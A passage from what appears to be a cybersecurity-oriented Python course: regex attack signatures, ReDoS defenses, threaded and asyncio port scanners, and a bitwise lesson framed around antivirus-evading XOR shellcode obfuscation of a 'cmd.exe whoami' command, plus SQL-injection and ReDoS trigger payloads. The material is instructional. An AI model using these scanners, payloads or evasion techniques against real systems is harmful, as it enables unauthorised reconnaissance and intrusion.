\"Host 192.168.1.5 connected at 10:00:01, forwarded from 10.0.0.88.\"\nprint(\"Found IPs:\", ip_pattern.findall(log_sample))\n\n# 2. Named capture groups (?P&lt;name&gt;...) for parsing HTTP requests\nhttp_request_pattern = re.compile(r'^(?P&lt;method&gt;[A-Z]+)\\s+(?P&lt;uri&gt;\\S+)\\s+HTTP/(?P&lt;version&gt;\\d\\.\\d)$')\nmatch = http_request_pattern.match(\"POST /admin/upload.php?id=1 HTTP/1.1\")\nif match:\n    print(\"Structured Request:\", match.groupdict())</code></pre>\n</div>\n\n<h2>3. Hands-On: Production Security Signatures</h2>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Vulnerability and Credential Signature Library</div>\n  <pre><code class=\"language-python\">SIGNATURE_RULES = {\n    # 1. SQL Injection: Case-insensitive UNION SELECT or OR tautologies\n    \"SQL_INJECTION\": re.compile(r\"(?i)(?:union\\s+select|select\\s+.*?\\s+from|or\\s+[0-9'\\s]+=[0-9'\\s]+|waitfor\\s+delay)\"),\n    \n    # 2. Cross-Site Scripting: Script tags, JavaScript pseudo-protocols, event handlers\n    \"XSS_ATTACK\": re.compile(r\"(?i)(?:<\\s*script[^>]*>|javascript:\\s*alert|onerror\\s*=|onload\\s*=)\"),\n    \n    # 3. AWS Access Key IDs: AKIA prefix followed by 16 uppercase alphanumeric characters\n    \"AWS_KEY_LEAK\": re.compile(r\"\\b(AKIA[0-9A-Z]{16})\\b\"),\n    \n    # 4. JSON Web Tokens: Tri-part Base64 structure\n    \"JWT_TOKEN\": re.compile(r\"\\b(ey[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,})\\b\")\n}\n\ndef inspect_payload(text: str) -> list:\n    \"\"\"Inspects text payloads against signature library\"\"\"\n    hits = []\n    for rule_name, pattern in SIGNATURE_RULES.items():\n        matched = pattern.findall(text)\n        if matched:\n            hits.append({\"rule\": rule_name, \"matches\": matched})\n    return hits\n\nprint(inspect_payload(\"SELECT * FROM users WHERE id=1 OR 1=1;\"))\nprint(inspect_payload(\"Exposed token: AKIAIOSFODNN7EXAMPLE\"))</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Lazy Matching</strong>: Use <code>.*?</code> when parsing HTML and enclosed containers to avoid greedy over-consumption.</li>\n    <li><strong>Non-Capturing Groups</strong>: Enforce <code>(?:...)</code> when capturing is unnecessary to minimize memory overhead.</li>\n    <li><strong>Precompilation</strong>: Execute <code>re.compile()</code> to cache regex evaluation across large log streams.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Signature Authoring</div>\n  <p><strong>Exercise 1:</strong> Author a regular expression that validates an international mobile number (starts with <code>1</code>, followed by digits <code>3-9</code>, followed by 9 digits), anchoring with <code>^</code> and <code>$</code>.</p>\n  <p><strong>Exercise 2:</strong> When matching <code>&lt;a href=\"evil.com\"&gt;click&lt;/a&gt; ... &lt;a href=\"safe.com\"&gt;home&lt;/a&gt;</code>, why does <code>&lt;a.*&gt;</code> match everything from the first <code>&lt;a</code> to the last <code>&gt;</code>? How is it resolved?</p>\n</div>\n","checkpoints":[{"question":"When parsing HTML tag contents, why should security engineers deploy lazy quantifiers `.*?` over greedy quantifiers `.*`?","options":["Lazy evaluation executes 100 times faster than greedy modes","Greedy quantifiers consume the maximal matching sequence, spanning across closing delimiters and consuming legitimate surrounding code","Greedy modes cannot match newline characters","Lazy evaluation applies only to numeric digits"],"answer":1,"explanation":"Greedy matching consumes as many characters as possible. When parsing `<a href='1'>x</a><a href='2'>y</a>`, `<a.*>` swallows everything to the final `>`, ruining isolated extraction."},{"question":"What distinguishes a non-capturing group `(?:pattern)` from standard capture groups `(pattern)` in security analysis?","options":["`(?:pattern)` applies sub-expression grouping without indexing or persisting the match into backreference memory, reducing runtime overhead","`(?:pattern)` automatically computes MD5 hashes of matched strings","`(?:pattern)` matches only uppercase ASCII characters","`(?:pattern)` forces automated retries upon evaluation failure"],"answer":0,"explanation":"Non-capturing groups `(?:...)` allow logical grouping (e.g. for alternations) without allocating memory to track numbered backreferences, improving regex engine throughput."}]},
  "prog-05-02": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Denial of Service</div>\n  <h1>Catastrophic Backtracking & ReDoS Defense</h1>\n  <p class=\"lead\">On July 2, 2019, Cloudflare suffered a global outage that downed Discord, Shopify, and Coinbase. The incident was not caused by an advanced persistent threat, but by an unhardened regular expression inside their WAF engine that induced catastrophic backtracking, pegging global CPU cores at 100%. This section deconstructs Non-deterministic Finite Automaton (NFA) backtracking, evil regex models, and algorithmic mitigations.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Deconstruct <strong>NFA (Non-deterministic Finite Automata)</strong> backtracking versus DFA engines.</li>\n    <li>Identify vulnerable <strong>Evil Regex</strong> patterns exhibiting nested quantifiers and overlapping alternations.</li>\n    <li>Analyze the mathematical transition from $O(n)$ linear execution to $O(2^n)$ exponential explosion.</li>\n    <li>Implement industrial ReDoS mitigations: input guards, watchdogs, and linear-time DFA engines.</li>\n  </ul>\n</div>\n\n<h2>1. NFA Backtracking & Exponential Explosion</h2>\n<p>Modern runtimes (Python, Java, JavaScript, PCRE) rely on NFA engines to support lookarounds and backreferences. When evaluation fails, the NFA <strong>backtracks recursively across every alternative permutation</strong>:</p>\n<p>Examine the classic evil pattern: <code>^(a+)+$</code></p>\n<ul>\n  <li>Matching <code>\"aaaaa\"</code> completes instantly.</li>\n  <li>Matching <code>\"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"</code> (failing on the terminal character):</li>\n  <li>Nested <code>+</code> quantifiers force the engine to evaluate all combinations of distributing letters between inner and outer loops, scaling at <strong>$O(2^n)$ complexity</strong>.</li>\n  <li>At $n=30$, step operations exceed $10^9$; at $n=40$, evaluation requires days, consuming 100% CPU capacity and causing complete application denial-of-service.</li>\n</ul>\n\n<h2>2. Canonical Evil Regex Patterns</h2>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Vulnerable Pattern</th>\n      <th>Sample Syntax</th>\n      <th>Trigger Payload</th>\n      <th>Root Vulnerability</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Nested Quantifiers</strong></td>\n      <td><code>(x+)+y</code>, <code>(a|b*)+$</code></td>\n      <td><code>\"xxxxxxxxxxxxxxxxxxxx!\"</code></td>\n      <td>Multiple repeating operators generate exponential permutation trees.</td>\n    </tr>\n    <tr>\n      <td><strong>Overlapping Alternations</strong></td>\n      <td><code>(a|aa)+$</code></td>\n      <td><code>\"aaaaaaaaaaaaaaaaaaaa!\"</code></td>\n      <td>Ambiguous options force exhaustive backtracking on terminal failure.</td>\n    </tr>\n    <tr>\n      <td><strong>Flanked Wildcards</strong></td>\n      <td><code>.*a.*b</code> (unanchored)</td>\n      <td>Extended text lacking character <code>b</code></td>\n      <td>Leading wildcards repeatedly swallow and step back across characters.</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>3. Engineering Resilient ReDoS Defenses</h2>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Defense Layer 1: Input Length Hard-Capping</div>\n  <pre><code class=\"language-python\">def safe_regex_search(pattern: re.Pattern, text: str, max_length=512) -> bool:\n    \"\"\"Enforce strict length limits before passing data to NFA engines\"\"\"\n    if not text or len(text) > max_length:\n        return False\n    return bool(pattern.search(text))</code></pre>\n</div>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Defense Layer 2: Eliminating Overlapping Alternations</div>\n  <pre><code class=\"language-python\"># ❌ VULNERABLE: Overlapping whitespace vs non-whitespace classes\nvuln_regex = r\"^(\\s*|\\S*)*$\"\n\n# ✅ HARDENED: Mutually exclusive character sets eliminate ambiguity\nhardened_regex = r\"^[a-zA-Z0-9_-]+$\"</code></pre>\n</div>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Defense Layer 3: Watchdog Timeout Enforcement</div>\n  <pre><code class=\"language-python\">import concurrent.futures\nimport re\n\ndef regex_with_timeout(pattern_str: str, text: str, timeout_sec=0.2):\n    \"\"\"Enforces sub-second timeout controls over regex evaluations\"\"\"\n    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:\n        future = executor.submit(re.search, pattern_str, text)\n        try:\n            return future.result(timeout=timeout_sec)\n        except concurrent.futures.TimeoutError:\n            print(\"[!] CRITICAL: ReDoS attack intercepted and terminated!\")\n            return None</code></pre>\n</div>\n\n<div class=\"callout callout-warning\">\n  <div class=\"callout-title\">⚠️ The Ultimate Defense: Google RE2 (DFA Engine)</div>\n  <p>When an application permits external untrusted users to supply custom regexes (e.g. SIEM search boxes), never execute them inside Python's native <code>re</code> engine. Deploy Google <code>re2</code> (<code>pip install re2</code>). RE2 uses a Deterministic Finite Automaton (DFA) that <strong>mathematically guarantees linear execution time $O(n)$ relative to input length</strong>, making ReDoS structurally impossible.</p>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>NFA Backtracking</strong>: Evaluation failures force recursive permutation sweeps, generating $O(2^n)$ complexity under nested quantifiers.</li>\n    <li><strong>Pattern Red Flags</strong>: Avoid patterns structured as <code>(x+)+</code> or alternations with overlapping sets like <code>(a|aa)+</code>.</li>\n    <li><strong>Four-Tier Defense</strong>: Enforce input bounds $\to$ remove overlapping ambiguity $\to$ wrap in timeouts $\to$ transition to Google RE2.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: ReDoS Analysis</div>\n  <p><strong>Exercise 1:</strong> Why is <code>^([a-zA-Z0-9]+)*$</code> a dangerous regex pattern? Formulate a 30-character payload that induces measurable CPU latency in an NFA engine.</p>\n  <p><strong>Exercise 2:</strong> In the email validation pattern <code>^([a-zA-Z0-9_\\.-]+)@([\\da-zA-Z\\.-]+)\\.([a-zA-Z\\.]{2,6})$</code>, identify the ambiguous backtracking overlap inside the domain segment and provide a hardened replacement.</p>\n</div>\n","checkpoints":[{"question":"What architectural mechanism triggered the 2019 Cloudflare outage via a Regular Expression Denial of Service (ReDoS)?","options":["The regex engine attempted disk write operations that blocked I/O buses","An NFA regex engine evaluating nested quantifiers (e.g. `(a+)+$`) against non-matching input triggered exponential backtracking ($O(2^n)$ steps), pegging CPU cores at 100%","Format string vulnerabilities inside regex patterns caused kernel panic dumps","The regex triggered outbound UDP packet floods"],"answer":1,"explanation":"NFA engines backtrack recursively on evaluation failure. Nested quantifiers generate $O(2^n)$ permutation paths, locking single CPU cores at 100% on inputs with just 30-40 characters."},{"question":"What architectural approach mathematically eliminates ReDoS vulnerabilities when accepting dynamic user-supplied regexes?","options":["Prohibiting character 'a' in user regexes","Deploying a Deterministic Finite Automaton (DFA) engine like Google RE2, which mathematically guarantees linear execution time $O(n)$ without backtracking","Installing liquid cooling modules on host servers","Deploying unbounded retry loops across multiple threads"],"answer":1,"explanation":"Google RE2 uses a pure DFA engine. DFAs maintain a single deterministic state transition per input character, guaranteeing linear time complexity O(n) and making ReDoS impossible."}]},
  "prog-06-01": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Concurrency Basics</div>\n  <h1>Threading vs Multiprocessing: GIL Bounds & Concurrency Balancing</h1>\n  <p class=\"lead\">Single-threaded security scanners auditing massive IP subnets or enumerating web paths require hours or days to conclude. Transforming operational tool performance from hours into seconds requires mastering concurrency models. This section explores Python's Global Interpreter Lock (GIL), architectural tradeoffs between processes and threads across I/O vs CPU workloads, and thread-safe lock mechanisms.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Understand memory isolation and context-switching costs separating Processes from Threads.</li>\n    <li>Demystify the Python <strong>Global Interpreter Lock (GIL)</strong> and why network I/O achieves massive scaling.</li>\n    <li>Deploy modern pool abstractions via <code>concurrent.futures.ThreadPoolExecutor</code>.</li>\n    <li>Prevent race conditions using <code>threading.Lock</code> to guarantee atomic asset reporting.</li>\n  </ul>\n</div>\n\n<h2>1. Processes vs Threads: Architectural Foundations</h2>\n<p>Modern operating systems partition concurrency across distinct paradigms:</p>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Dimension</th>\n      <th>Multiprocessing</th>\n      <th>Threading</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Memory Architecture</strong></td>\n      <td>Completely isolated virtual address spaces per process.</td>\n      <td>Shared heap, global memory, and open descriptors within process.</td>\n    </tr>\n    <tr>\n      <td><strong>Communication Overhead</strong></td>\n      <td>Requires explicit IPC (pipes, shared memory, queues); high cost.</td>\n      <td>Direct memory read/write; fast (requires synchronization locks).</td>\n    </tr>\n    <tr>\n      <td><strong>Context Switching</strong></td>\n      <td>Expensive (flushing memory management units and page tables).</td>\n      <td>Lightweight (swapping CPU registers and thread stack pointers).</td>\n    </tr>\n    <tr>\n      <td><strong>Target Workload</strong></td>\n      <td><strong>CPU-Bound</strong>: Password hashing, offline cryptanalysis.</td>\n      <td><strong>I/O-Bound</strong>: Port discovery, web crawler sweeps, API fuzzing.</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. Demystifying the Python GIL (Global Interpreter Lock)</h2>\n<p>CPython enforces a mutex: the <strong>Global Interpreter Lock (GIL)</strong>. The GIL ensures only one operating system thread executes Python bytecode at any given moment:</p>\n<ul>\n  <li><strong>CPU-Bound Constraint</strong>: Compute-intensive operations (cryptographic cracking) cannot achieve true multi-core acceleration with threads. Deploy <code>multiprocessing</code> instead.</li>\n  <li><strong>I/O-Bound Liberation</strong>: When a thread initiates network I/O (e.g. awaiting <code>socket.connect()</code> or HTTP responses), CPython <strong>releases the GIL immediately</strong>. While one thread waits for remote packets, other threads execute, delivering 50x-100x performance gains.</li>\n</ul>\n\n<h2>3. Hands-On: Thread-Safe Port Scanner with ThreadPoolExecutor</h2>\n<p>Unsynchronized concurrent writes to shared arrays (<code>open_ports.append(p)</code>) induce race conditions. We enforce atomicity via <code>threading.Lock</code>:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Production ThreadPoolExecutor Scanner with Lock Guards</div>\n  <pre><code class=\"language-python\">import socket\nimport threading\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\n\nopen_ports = []\nlock = threading.Lock()\n\ndef scan_single_port(target_host: str, port: int, timeout=1.0) -> int:\n    \"\"\"Probes a single port, writing verified openings to thread-safe list\"\"\"\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(timeout)\n    result = sock.connect_ex((target_host, port))\n    sock.close()\n    \n    if result == 0:\n        with lock:\n            open_ports.append(port)\n            print(f\"[+] Discovered Open Port: {port:5}\")\n        return port\n    return 0\n\ndef concurrent_port_sweep(target: str, ports: list[int], max_workers=50):\n    print(f\"[*] Scanning {target} with {max_workers} threads...\")\n    with ThreadPoolExecutor(max_workers=max_workers) as executor:\n        futures = [executor.submit(scan_single_port, target, p) for p in ports]\n        for _ in as_completed(futures):\n            pass\n\n    print(f\"[*] Complete! Open Ports: {sorted(open_ports)}\")\n\nconcurrent_port_sweep(\"127.0.0.1\", list(range(1, 1025)), max_workers=64)</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Model Selection</strong>: Deploy <code>ThreadPoolExecutor</code> for network I/O; leverage <code>ProcessPoolExecutor</code> for CPU-bound hashing.</li>\n    <li><strong>GIL Behavior</strong>: Sockets release the GIL automatically during network wait states.</li>\n    <li><strong>State Synchronization</strong>: Protect shared lists and dictionaries using <code>with lock:</code> blocks.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Concurrency Limits</div>\n  <p><strong>Exercise 1:</strong> If <code>max_workers</code> is configured to 5,000, why does the OS raise <code>OSError: [Errno 24] Too many open files</code>? How is this limit raised on Linux?</p>\n  <p><strong>Exercise 2:</strong> Implement a minimal script utilizing <code>multiprocessing.Pool</code> to compute 100,000 MD5 hashes concurrently, verifying that multiple physical CPU cores achieve 100% utilization.</p>\n</div>\n","checkpoints":[{"question":"Why does Python multi-threading deliver massive performance gains during network port scanning despite the Global Interpreter Lock (GIL)?","options":["The GIL applies only to Windows and is disabled on Linux","Python automatically releases the GIL whenever threads enter blocking system calls for network socket I/O, allowing concurrent socket handshakes","Network port scanning requires zero CPU clock cycles","The threading module compiles Python code directly into native C"],"answer":1,"explanation":"Network scanning is overwhelmingly I/O-bound. Whenever a thread blocks awaiting a network socket response, CPython releases the GIL, allowing other threads to dispatch probes concurrently."},{"question":"When multiple worker threads append discovered ports to a shared list `open_ports`, why is `threading.Lock` mandatory?","options":["Locks prevent target firewalls from discovering scanning activity","Locks prevent race conditions that can corrupt internal list pointers or cause concurrent writes to overwrite and lose data","Locks accelerate TCP handshake speeds","Python syntax requires all list objects to be locked"],"answer":1,"explanation":"List append operations in multi-threaded environments are not atomic at the bytecode level. Mutex locks prevent race conditions, ensuring only one thread updates the shared list at a time."}]},
  "prog-06-02": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Async Architecture</div>\n  <h1>Async I/O (asyncio/aiohttp): High-Throughput Network Scanners</h1>\n  <p class=\"lead\">While multi-threading improves performance, scaling beyond thousands of concurrent connections causes thread scheduling overhead and memory consumption (8MB stack per thread) to exhaust system capacity. Industry-leading scanning engines (ProjectDiscovery HTTPX, Naabu) leverage single-threaded <strong>Asynchronous I/O (asyncio)</strong> architectures. This section explores event loop multiplexing and high-performance reconnaissance engines.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Understand the <strong>Event Loop</strong>, coroutines (<code>async def</code>), and non-blocking suspension (<code>await</code>).</li>\n    <li>Harness lightweight coroutines: maintain 10,000+ connections with minimal memory overhead.</li>\n    <li>Deploy <code>asyncio.Semaphore</code> to throttle connection rates and avoid socket exhaustion.</li>\n    <li>Develop a production asynchronous port and path scanning engine.</li>\n  </ul>\n</div>\n\n<h2>1. Threading vs Coroutines: Scaling to 10,000+ Connections</h2>\n<p>Async I/O executes within a single thread, polling non-blocking sockets via kernel multiplexers (epoll/kqueue/IOCP):</p>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Metric</th>\n      <th>Multi-Threading</th>\n      <th>Async Coroutines (asyncio)</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Scheduling</strong></td>\n      <td>Kernel-preempted context switching</td>\n      <td>User-space cooperative scheduling via explicit <code>await</code> calls</td>\n    </tr>\n    <tr>\n      <td><strong>Memory Cost</strong></td>\n      <td>2MB-8MB per thread stack (1,000 threads = gigabytes of RAM)</td>\n      <td>Hundreds of bytes per coroutine (10,000 coroutines &lt; 50MB RAM)</td>\n    </tr>\n    <tr>\n      <td><strong>Lock Contention</strong></td>\n      <td>High contention; shared variables demand synchronization locks</td>\n      <td>Single-threaded execution avoids race conditions within synchronized blocks</td>\n    </tr>\n    <tr>\n      <td><strong>Max Concurrency</strong></td>\n      <td>Typically bounded at 500 - 1,000 threads</td>\n      <td>Easily sustains <strong>10,000 - 50,000+</strong> active connections</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. The Triad of Async Architecture</h2>\n<ul>\n  <li><code>async def</code>: Defines an asynchronous coroutine function.</li>\n  <li><code>await</code>: Yields execution back to the event loop, permitting other ready coroutines to proceed.</li>\n  <li><code>asyncio.Semaphore(N)</code>: Controls concurrency. Without a semaphore, the loop initiates tens of thousands of simultaneous sockets, triggering immediate file descriptor exhaustion and firewall rate limits.</li>\n</ul>\n\n<h2>3. Hands-On: High-Throughput Async Port Scanner</h2>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Native asyncio Non-Blocking Port Discovery Engine</div>\n  <pre><code class=\"language-python\">import asyncio\nimport time\n\nasync def probe_port(semaphore: asyncio.Semaphore, host: str, port: int, timeout=1.0) -> int:\n    \"\"\"Probes a single port with bounded semaphore concurrency\"\"\"\n    async with semaphore:\n        try:\n            conn = asyncio.open_connection(host, port)\n            reader, writer = await asyncio.wait_for(conn, timeout=timeout)\n            writer.close()\n            await writer.wait_closed()\n            print(f\"[+] [OPEN] {host}:{port}\")\n            return port\n        except (asyncio.TimeoutError, ConnectionRefusedError, OSError):\n            return 0\n\nasync def main():\n    target_host = \"127.0.0.1\"\n    ports_to_scan = list(range(1, 2001))\n    \n    # Cap active simultaneous connections at 300\n    sem = asyncio.Semaphore(300)\n    \n    start_time = time.time()\n    print(f\"[*] Starting Asyncio Scan against {target_host} (Ports: 1-2000)...\")\n    \n    tasks = [probe_port(sem, target_host, p) for p in ports_to_scan]\n    results = await asyncio.gather(*tasks)\n    \n    open_ports = [p for p in results if p != 0]\n    elapsed = round(time.time() - start_time, 2)\n    print(f\"[*] Finished in {elapsed}s! Found {len(open_ports)} open ports: {open_ports}\")\n\nif __name__ == \"__main__\":\n    asyncio.run(main())</code></pre>\n</div>\n\n<div class=\"callout callout-warning\">\n  <div class=\"callout-title\">⚠️ Common Pitfall: Invoking Blocking Synchronous Calls</div>\n  <p>Inside an <code>async def</code> coroutine, calling synchronous blocking functions (e.g. <code>time.sleep(1)</code> or standard <code>requests.get()</code>) <strong>halts the single-threaded event loop completely</strong>, freezing all concurrent coroutines. Always deploy asynchronous equivalents: <code>asyncio.sleep()</code> and <code>aiohttp.ClientSession</code>.</p>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Event Loop Scaling</strong>: Non-blocking socket polling eliminates thread stack overhead, achieving massive scaling.</li>\n    <li><strong>Semaphore Discipline</strong>: Regulate connection pools with <code>asyncio.Semaphore(N)</code> to avoid socket starvation.</li>\n    <li><strong>Pure Async Pipeline</strong>: Never embed blocking synchronous functions inside coroutine functions.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Async Architecture</div>\n  <p><strong>Exercise 1:</strong> Why should an <code>aiohttp</code> scanning engine reuse a single persistent <code>ClientSession</code> across tasks rather than instantiating a new session per request?</p>\n  <p><strong>Exercise 2:</strong> How can rate limiting be implemented within an <code>asyncio</code> architecture if a target server blocks clients exceeding 50 requests per second?</p>\n</div>\n","checkpoints":[{"question":"Compared to traditional multi-threading, why can an `asyncio` coroutine architecture sustain 10,000+ concurrent network connections?","options":["Coroutines are scheduled by hardware CPU hyperthreads in kernel space","Coroutines execute on a single-threaded event loop using non-blocking I/O (epoll); coroutines consume hundreds of bytes compared to megabytes of thread stack memory","asyncio bypasses TCP three-way handshakes","Coroutines automatically boost physical network interface bandwidth"],"answer":1,"explanation":"Operating system threads require 2-8MB of stack memory each and incur heavy kernel context-switching overhead. Asynchronous coroutines are lightweight user-space objects multiplexed over epoll."},{"question":"Why is enforcing an `asyncio.Semaphore(N)` essential in high-concurrency network scanners?","options":["Python scripts fail compilation without a semaphore object","It restricts the maximum volume of simultaneous open sockets, preventing operating system file descriptor exhaustion (`EMFILE`) and firewall rate-limits","Semaphores write open port records to databases automatically","Semaphores accelerate DNS hostname resolution"],"answer":1,"explanation":"Without a concurrency gate, the event loop would instantiate tens of thousands of sockets instantaneously, breaching system file descriptor limits (Too many open files) and triggering firewalls."}]},
  "prog-07-01": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Low-Level Algorithms</div>\n  <h1>Bitwise Operations: XOR Crypto, Bitmasks & Shellcode Obfuscation</h1>\n  <p class=\"lead\">At the lowest architecture layer, computing operations reduce to binary bit states in hardware registers. Bitwise operations manipulate binary bits directly at CPU clock-cycle speeds. From Unix file permissions and network subnet masks to antivirus-evading XOR shellcode packers and cryptographic avalanche pipelines, bitwise logic is ubiquitous. This section explores bitwise primitives, permission bitmask engineering, and XOR obfuscation mechanics.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Master the six bitwise operators: AND (<code>&amp;</code>), OR (<code>|</code>), XOR (<code>^</code>), NOT (<code>~</code>), Left Shift (<code>&lt;&lt;</code>), and Right Shift (<code>&gt;&gt;</code>).</li>\n    <li>Construct a <strong>Bitmask Permission Engine</strong> storing multiple authorization flags in a single integer.</li>\n    <li>Understand the <strong>XOR Involutory Property ($A oplus B oplus B = A$)</strong> for zero-cost symmetric obfuscation.</li>\n    <li>Develop a rolling multi-byte XOR shellcode packer and in-memory dynamic deobfuscation stub.</li>\n  </ul>\n</div>\n\n<h2>1. The Six Core Bitwise Operators</h2>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Operator</th>\n      <th>Mathematical Name</th>\n      <th>Evaluation Logic</th>\n      <th>Cybersecurity Applications</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>&amp;</code></td>\n      <td>Bitwise AND</td>\n      <td>1 only if both bits are 1; otherwise 0</td>\n      <td>Mask extraction: isolating subnets and security flags.</td>\n    </tr>\n    <tr>\n      <td><code>|</code></td>\n      <td>Bitwise OR</td>\n      <td>1 if at least one bit is 1; otherwise 0</td>\n      <td>Activating permissions and setting operational flags.</td>\n    </tr>\n    <tr>\n      <td><code>^</code></td>\n      <td>Bitwise XOR</td>\n      <td>0 if bits match; 1 if bits differ</td>\n      <td>Symmetric cipher streams, payload packers, anti-reversing.</td>\n    </tr>\n    <tr>\n      <td><code>~</code></td>\n      <td>Bitwise NOT</td>\n      <td>Inverts all binary bits (0 to 1, 1 to 0)</td>\n      <td>Clearing flags via <code>&amp; ~MASK</code> operations.</td>\n    </tr>\n    <tr>\n      <td><code>&lt;&lt;</code></td>\n      <td>Left Shift</td>\n      <td>Shifts bits left, filling zero on low bits ($\times 2^N$)</td>\n      <td>Constructing dynamic bitmasks via <code>(1 &lt;&lt; N)</code>.</td>\n    </tr>\n    <tr>\n      <td><code>&gt;&gt;</code></td>\n      <td>Right Shift</td>\n      <td>Shifts bits right, preserving sign bit ($div 2^N$)</td>\n      <td>Extracting high-order bytes from raw network frames.</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. The Bitmask Security Permission Architecture</h2>\n<p>Unix permission bits (r=4, w=2, x=1) demonstrate how bitmasks encapsulate multi-tiered rights in single integer words:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Bitmask Authorization Engine in Python</div>\n  <pre><code class=\"language-python\">PERM_READ    = 1 &lt;&lt; 0  # 0001 (1)\nPERM_WRITE   = 1 &lt;&lt; 1  # 0010 (2)\nPERM_EXEC    = 1 &lt;&lt; 2  # 0100 (4)\nPERM_ADMIN   = 1 &lt;&lt; 3  # 1000 (8)\n\n# 1. Granting privileges: Bitwise OR (|)\nuser_perms = PERM_READ | PERM_WRITE  # 0011 (Read + Write)\n\n# 2. Auditing privileges: Bitwise AND (&amp;)\ndef check_permission(user_mask: int, target_perm: int) -> bool:\n    return (user_mask &amp; target_perm) == target_perm\n\nprint(\"Can Read? :\", check_permission(user_perms, PERM_READ))   # True\nprint(\"Is Admin? :\", check_permission(user_perms, PERM_ADMIN))  # False\n\n# 3. Revoking privileges: Bitwise AND with Inverted Mask (&amp; ~)\nuser_perms = user_perms &amp; ~PERM_WRITE\nprint(\"Can Write After Revocation? :\", check_permission(user_perms, PERM_WRITE)) # False</code></pre>\n</div>\n\n<h2>3. Hands-On: Shellcode Rolling XOR Obfuscation Engine</h2>\n<p>Signature-based Antivirus (AV) intercepts plain strings like <code>VirtualAlloc</code>. Multi-byte rolling XOR disrupts static patterns:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Rolling Multi-Byte XOR Obfuscation Pipeline</div>\n  <pre><code class=\"language-python\">def xor_crypt(data: bytes, key: bytes) -> bytes:\n    \"\"\"\n    Symmetric XOR encryption/decryption:\n    Mathematical property: A ^ B ^ B = A\n    \"\"\"\n    key_len = len(key)\n    return bytes([b ^ key[i % key_len] for i, b in enumerate(data)])\n\nraw_shellcode = b\"cmd.exe /c whoami &amp;&amp; net user\"\nxor_key = b\"CyberEduSecretKey\"\n\n# Step 1: Obfuscate prior to compilation\nobfuscated = xor_crypt(raw_shellcode, xor_key)\nprint(f\"[*] Obfuscated Hex: {obfuscated.hex()}\")\n\n# Step 2: In-memory dynamic deobfuscation\nrecovered = xor_crypt(obfuscated, xor_key)\nprint(f\"[+] Recovered Plaintext: {recovered.decode('utf-8')}\")</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Bitmask Triad</strong>: Grant with <code>|=</code>, check with <code>&amp;</code>, and revoke with <code>&amp;= ~</code>.</li>\n    <li><strong>XOR Symmetry</strong>: Involutory property eliminates encryption overhead without altering payload length.</li>\n    <li><strong>Hardware Speed</strong>: Bit operations execute within a single CPU cycle, optimizing real-time filtering engines.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Bitwise Operations</div>\n  <p><strong>Exercise 1:</strong> Why do binary exploit developers actively eliminate null bytes (<code>\\x00</code>) in shellcode? How does single-byte XOR with <code>0xAA</code> sanitize opcodes?</p>\n  <p><strong>Exercise 2:</strong> Implement a function <code>is_power_of_two(n)</code> in one single line of bitwise Python logic to determine if integer $n$ is a power of 